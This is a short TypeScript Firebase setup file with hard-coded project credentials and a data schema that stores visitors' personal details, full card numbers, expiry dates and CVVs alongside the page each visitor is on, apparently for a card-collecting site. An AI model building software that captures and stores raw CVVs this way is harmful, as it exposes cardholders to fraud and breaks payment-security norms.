import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
    apiKey: "AIzaSyCUweKAfXJMW10BvzllQApSl41onSFoT80",
    authDomain: "msa22-aa2e4.firebaseapp.com",
    projectId: "msa22-aa2e4",
    storageBucket: "msa22-aa2e4.firebasestorage.app",
    messagingSenderId: "919911184061",
    appId: "1:919911184061:web:8f46fe98dc2a421db5e9d4",
    measurementId: "G-TWNKTN8W34"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

